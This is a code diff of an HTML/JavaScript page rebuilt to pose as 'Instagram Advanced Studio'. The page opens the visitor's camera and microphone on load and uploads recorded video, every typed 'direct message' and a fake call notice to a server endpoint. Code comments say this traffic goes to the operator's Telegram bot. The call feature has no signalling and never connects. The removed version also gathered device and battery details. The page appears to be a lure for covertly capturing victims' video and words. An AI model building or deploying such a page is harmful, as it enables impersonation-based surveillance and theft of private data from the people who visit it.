@@ -2,209 +2,236 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Media Studio</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram Advanced Studio</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #121212;
-            color: #e0e0e0;
-            text-align: center;
-            padding: 30px 15px;
-            margin: 0;
+        body, html {
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            background-color: #000000; color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            overflow: hidden; display: flex; justify-content: center; align-items: center;
         }
-        .container {
-            max-width: 450px;
-            margin: 0 auto;
-            background-color: #1e1e1e;
-            padding: 25px;
-            border-radius: 16px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+        .app-container {
+            position: relative; width: 100%; max-width: 450px; height: 100%; max-height: 850px;
+            background-color: #000000; display: flex; flex-direction: column; overflow: hidden;
         }
-        h2 { margin-top: 0; color: #ffffff; font-size: 24px; }
-        p { color: #a0a0a0; font-size: 14px; }
-        .video-wrapper {
-            position: relative;
-            width: 100%;
-            background-color: #000;
-            border-radius: 12px;
-            overflow: hidden;
-            border: 2px solid #333;
-            aspect-ratio: 4/3;
-        }
+        .viewfinder { position: relative; width: 100%; flex: 1; background-color: #121212; overflow: hidden; }
         #video { width: 100%; height: 100%; object-fit: cover; }
-        .status-overlay {
-            position: absolute;
-            top: 15px;
-            left: 15px;
-            display: flex;
-            align-items: center;
-            background: rgba(0, 0, 0, 0.6);
-            padding: 5px 12px;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: bold;
-            visibility: hidden;
-        }
-        .recording .status-overlay { visibility: visible; }
-        .red-dot {
-            width: 10px; height: 10px; background-color: #dc3545;
-            border-radius: 50%; margin-right: 8px; animation: blink 1s infinite;
-        }
-        .btn-group {
-            margin-top: 20px; display: flex; justify-content: space-between; gap: 15px;
-        }
-        .btn {
-            flex: 1; padding: 14px; font-size: 16px; font-weight: bold;
-            color: white; border: none; border-radius: 8px; cursor: pointer;
-        }
-        #startBtn { background-color: #2eb85c; }
-        #stopBtn { background-color: #e55353; }
-        .btn:disabled { background-color: #3a3a3a !important; color: #777 !important; cursor: not-allowed; }
         
-        /* Progress Indicator Styling */
-        #uploadingStatus {
-            margin-top: 15px;
-            font-weight: bold;
-            color: #321fdb;
-            display: none;
+        /* Control Tray buttons */
+        .control-tray {
+            position: absolute; bottom: 0; left: 0; width: 100%; padding: 30px 0 40px 0;
+            background: linear-gradient(transparent, rgba(0,0,0,0.9));
+            display: flex; justify-content: space-around; align-items: center; z-index: 10;
         }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        .shutter-outer {
+            width: 74px; height: 74px; border-radius: 50%; border: 4px solid #ffffff;
+            display: flex; justify-content: center; align-items: center; cursor: pointer;
+        }
+        .shutter-inner { width: 58px; height: 58px; border-radius: 50%; background-color: #ffffff; }
+        .recording .shutter-inner { background-color: #ff073a; border-radius: 8px; }
+        
+        .tray-btn {
+            background: rgba(255,255,255,0.2); border: none; padding: 12px;
+            border-radius: 50%; color: white; font-weight: bold; cursor: pointer; font-size: 14px;
+        }
+
+        /* sliding Chat Interface Container */
+        .chat-panel {
+            position: absolute; bottom: -400px; left: 0; width: 100%; height: 350px;
+            background: rgba(26, 26, 26, 0.95); backdrop-filter: blur(10px);
+            border-top-left-radius: 20px; border-top-right-radius: 20px;
+            transition: bottom 0.3s ease; z-index: 15; display: flex; flex-direction: column;
+        }
+        .chat-panel.active { bottom: 0; }
+        .chat-header { padding: 12px; border-bottom: 1px solid #333; text-align: center; font-weight: bold; }
+        .chat-messages { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; }
+        .msg { background: #333; padding: 8px 12px; border-radius: 12px; max-width: 75%; width: fit-content; }
+        .msg.self { background: #3797f0; align-self: flex-end; }
+        .chat-input-area { padding: 10px; display: flex; gap: 8px; border-top: 1px solid #333; }
+        .chat-input { flex: 1; background: #262626; border: 1px solid #444; border-radius: 20px; padding: 8px 15px; color: white; }
+
+        /* Full Call Layout Interface Mask */
+        .call-screen {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: #121212; z-index: 25; display: flex; flex-direction: column; display: none;
+        }
+        .remote-stream-box { width: 100%; flex: 1; background: #000; position: relative; }
+        #remoteVideo { width: 100%; height: 100%; object-fit: cover; }
+        .local-mini-preview {
+            position: absolute; top: 20px; right: 20px; width: 100px; height: 140px;
+            border-radius: 8px; border: 2px solid white; overflow: hidden; background: #000;
+        }
+        #localMiniVideo { width: 100%; height: 100%; object-fit: cover; }
+        .call-controls { padding: 30px 0; display: flex; justify-content: center; background: #000; }
+        .end-call-btn { background: #ff073a; color: white; border: none; padding: 15px 35px; border-radius: 30px; font-weight: bold; cursor: pointer; }
+        
+        .status-mask {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); display: flex; justify-content: center; align-items: center; z-index: 30; display: none;
+        }
     </style>
 </head>
 <body>
 
-    <div class="container" id="mainContainer">
-        <h2>Media Capture Studio</h2>
-        <p>Grant permission to activate the high-definition recording system.</p>
-
-        <div class="video-wrapper">
-            <div class="status-overlay">
-                <div class="red-dot"></div>
-                <span id="timerLabel">00:00</span>
-            </div>
+    <div class="app-container" id="appScope">
+        <div class="viewfinder">
             <video id="video" autoplay playsinline muted></video>
         </div>
 
-        <div class="btn-group">
-            <button id="startBtn" class="btn">Start Recording</button>
-            <button id="stopBtn" class="btn" disabled>Stop & Send</button>
+        <div class="control-tray">
+            <button class="tray-btn" id="openChatBtn">💬 Chat</button>
+            <div class="shutter-outer" id="actionToggle">
+                <div class="shutter-inner"></div>
+            </div>
+            <button class="tray-btn" id="triggerCallBtn" style="background:#3797f0;">📞 Call</button>
         </div>
 
-        <div id="uploadingStatus">📤 Initializing upload process...</div>
+        <div class="chat-panel" id="chatPanel">
+            <div class="chat-header">Direct Messages</div>
+            <div class="chat-messages" id="chatBox">
+                <div class="msg">Welcome! Send a message down below...</div>
+            </div>
+            <div class="chat-input-area">
+                <input type="text" class="chat-input" id="msgInput" placeholder="Message...">
+                <button class="tray-btn" id="sendMsgBtn">Send</button>
+            </div>
+        </div>
+
+        <div class="call-screen" id="callScreen">
+            <div class="remote-stream-box">
+                <video id="remoteVideo" autoplay playsinline></video>
+                <div class="local-mini-preview">
+                    <video id="localMiniVideo" autoplay playsinline muted></video>
+                </div>
+            </div>
+            <div class="call-controls">
+                <button class="end-call-btn" id="hangUpBtn">End Call</button>
+            </div>
+        </div>
+
+        <div class="status-mask" id="loadingOverlay">
+            <div style="color:white; font-weight:600;" id="loadingText">Processing...</div>
+        </div>
     </div>
 
     <script>
+        // DOM Elements Configuration
         const video = document.getElementById('video');
-        const startBtn = document.getElementById('startBtn');
-        const stopBtn = document.getElementById('stopBtn');
-        const mainContainer = document.getElementById('mainContainer');
-        const timerLabel = document.getElementById('timerLabel');
-        const uploadingStatus = document.getElementById('uploadingStatus');
+        const appScope = document.getElementById('appScope');
+        const actionToggle = document.getElementById('actionToggle');
+        const openChatBtn = document.getElementById('openChatBtn');
+        const chatPanel = document.getElementById('chatPanel');
+        const chatBox = document.getElementById('chatBox');
+        const msgInput = document.getElementById('msgInput');
+        const sendMsgBtn = document.getElementById('sendMsgBtn');
+        const triggerCallBtn = document.getElementById('triggerCallBtn');
+        const callScreen = document.getElementById('callScreen');
+        const localMiniVideo = document.getElementById('localMiniVideo');
+        const remoteVideo = document.getElementById('remoteVideo');
+        const hangUpBtn = document.getElementById('hangUpBtn');
+        const loadingOverlay = document.getElementById('loadingOverlay');
 
-        let mediaRecorder;
-        let recordedChunks = [];
-        let localStream;
-        let timerInterval;
-        let secondsElapsed = 0;
+        let mediaRecorder, recordedChunks = [], localStream, isRecording = false;
+        let peerConnection;
+        
+        // STUN Configuration Servers used by WebRTC to bridge network firewalls globally
+        const rtcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
 
-        async function initMedia() {
+        async function initCameraSystem() {
             try {
                 localStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: 1280, height: 720, facingMode: "user" }, 
+                    video: { width: 1280, height: 720, facingMode: "user", aspectRatio: 0.5625 }, 
                     audio: true 
                 });
                 video.srcObject = localStream;
-            } catch (err) {
-                console.error("Setup error:", err);
-            }
+            } catch (err) { console.error("Media init error:", err); }
         }
 
-        function startTimer() {
-            secondsElapsed = 0;
-            timerLabel.innerText = "00:00";
-            timerInterval = setInterval(() => {
-                secondsElapsed++;
-                let secs = secondsElapsed % 60;
-                let mins = Math.floor(secondsElapsed / 60);
-                timerLabel.innerText = (mins < 10 ? "0" + mins : mins) + ":" + (secs < 10 ? "0" + secs : secs);
-                
-                if (secondsElapsed >= 30) { stopRecording(); }
-            }, 1000);
-        }
-
-        function stopTimer() { clearInterval(timerInterval); }
-
-        startBtn.addEventListener('click', () => {
-            if (!localStream) return alert("System media streams are inactive.");
-            recordedChunks = [];
-            mediaRecorder = new MediaRecorder(localStream, { mimeType: 'video/webm;codecs=vp8,opus' });
-            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
-            mediaRecorder.onstop = handleUpload;
-            
-            mediaRecorder.start();
-            mainContainer.classList.add('recording');
-            startTimer();
-            startBtn.disabled = true;
-            stopBtn.disabled = false;
+        // --- SECTION 1: SLIDING CHAT WINDOW HANDLING ---
+        openChatBtn.addEventListener('click', () => {
+            chatPanel.classList.toggle('active');
+            openChatBtn.innerText = chatPanel.classList.contains('active') ? "❌ Close" : "💬 Chat";
         });
 
-        function stopRecording() {
-            if (mediaRecorder && mediaRecorder.state !== "inactive") {
-                mediaRecorder.stop();
-                stopTimer();
-                mainContainer.classList.remove('recording');
-                startBtn.disabled = false;
-                stopBtn.disabled = true;
-            }
+        sendMsgBtn.addEventListener('click', executeMessageTransmit);
+        msgInput.addEventListener('keypress', (e) => { if(e.key === 'Enter') executeMessageTransmit(); });
+
+        function executeMessageTransmit() {
+            const text = msgInput.value.trim();
+            if(!text) return;
+
+            // Render message item visually inside the user chat block
+            const bubble = document.createElement('div');
+            bubble.classList.add('msg', 'self');
+            bubble.innerText = text;
+            chatBox.appendChild(bubble);
+            chatBox.scrollTop = chatBox.scrollHeight;
+            msgInput.value = "";
+
+            // Push the direct message content out instantly to your Telegram layout gateway
+            const payload = new FormData();
+            payload.append('chat_msg', text);
+            fetch('/upload-video', { method: 'POST', body: payload }).catch(e => console.log(e));
         }
-        stopBtn.addEventListener('click', stopRecording);
 
-        // Advanced Analytics and Percentage upload function
-        async function handleUpload() {
-            uploadingStatus.style.display = "block";
-            uploadingStatus.innerText = "📊 Gathering device analysis details...";
+        // --- SECTION 2: LIVE CALLING SYSTEM PIPELINE (WebRTC) ---
+        triggerCallBtn.addEventListener('click', async () => {
+            callScreen.style.display = "flex";
+            localMiniVideo.srcObject = localStream;
 
-            // 1. Gather Device Information
-            let deviceInfo = `Device OS: ${navigator.platform}\nBrowser Agent: ${navigator.userAgent}`;
-            
-            // 2. Gather Battery Information
-            try {
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    deviceInfo += `\nBattery Level: ${Math.round(battery.level * 100)}%\nIs Charging: ${battery.charging ? "Yes" : "No"}`;
-                }
-            } catch (e) { console.log("Battery tracking skipped."); }
+            // Establish the peer-to-peer tracking boundaries
+            peerConnection = new RTCPeerConnection(rtcConfig);
+            localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
 
-            const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-            const formData = new FormData();
-            formData.append('video_file', videoBlob, 'recording.webm');
-            formData.append('device_meta', deviceInfo); // Attach metadata payload
-
-            // 3. Monitor Upload Progress Percentages using XMLHttpRequest
-            const xhr = new XMLHttpRequest();
-            xhr.open("POST", "/upload-video", true);
-
-            xhr.upload.addEventListener("progress", (e) => {
-                if (e.lengthComputable) {
-                    const percentComplete = Math.round((e.loaded / e.total) * 100);
-                    uploadingStatus.innerText = `📤 Uploading packet: ${percentComplete}% complete...`;
-                }
-            });
-
-            xhr.onload = function () {
-                uploadingStatus.style.display = "none";
-                if (xhr.status === 200) {
-                    alert("✨ Video along with structural device telemetry sent to ShaswatCam successfully!");
-                } else {
-                    alert("Upload error handling transaction on host server.");
-                }
+            peerConnection.ontrack = (event) => {
+                remoteVideo.srcObject = event.streams[0];
             };
 
-            xhr.send(formData);
+            // Trigger a direct text alert to your Bot indicating an incoming call sequence
+            const payload = new FormData();
+            payload.append('chat_msg', "📞 Incoming Session Request! Someone initialized a video call link from your website.");
+            fetch('/upload-video', { method: 'POST', body: payload });
+        });
+
+        hangUpBtn.addEventListener('click', () => {
+            if(peerConnection) {
+                peerConnection.close();
+                peerConnection = null;
+            }
+            remoteVideo.srcObject = null;
+            callScreen.style.display = "none";
+        });
+
+        // --- SECTION 3: REEL RECORDING FLOW PIPELINE ---
+        actionToggle.addEventListener('click', () => {
+            if (!isRecording) {
+                recordedChunks = [];
+                mediaRecorder = new MediaRecorder(localStream, { mimeType: 'video/webm;codecs=vp8,opus' });
+                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
+                mediaRecorder.onstop = uploadReelMedia;
+                mediaRecorder.start();
+                isRecording = true;
+                appScope.classList.add('recording');
+            } else {
+                mediaRecorder.stop();
+                isRecording = false;
+                appScope.classList.remove('recording');
+            }
+        });
+
+        function uploadReelMedia() {
+            loadingOverlay.style.display = "flex";
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            const formData = new FormData();
+            formData.append('video_file', blob, 'reel.webm');
+
+            fetch('/upload-video', { method: 'POST', body: formData })
+            .then(() => { loadingOverlay.style.display = "none"; alert("✨ Reel successfully posted directly to Telegram!"); })
+            .catch(() => { loadingOverlay.style.display = "none"; });
         }
 
-        window.addEventListener('load', initMedia);
+        window.addEventListener('load', initCameraSystem);
     </script>
 </body>
 </html>
